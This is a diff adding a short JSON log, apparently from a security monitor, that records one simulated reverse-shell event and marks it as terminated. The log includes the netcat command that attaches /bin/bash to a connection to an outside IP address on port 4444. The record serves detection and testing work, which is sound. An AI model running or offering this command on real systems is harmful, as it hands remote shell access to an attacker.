@@ -1,0 +1,13 @@
+[
+  {
+    "timestamp": "2026-10-18 14:06:28",
+    "pid": 98452,
+    "name": "nc",
+    "exe": "/bin/nc.traditional",
+    "threat_type": "REVERSE_SHELL_ATTACK",
+    "cmdline": "nc -e /bin/bash 198.51.100.44 4444 (Simulated Attack Neutralized)",
+    "action_taken": "IMMEDIATE_TERMINATION",
+    "severity": "CRITICAL \ud83d\udea8",
+    "simulated": true
+  }
+]
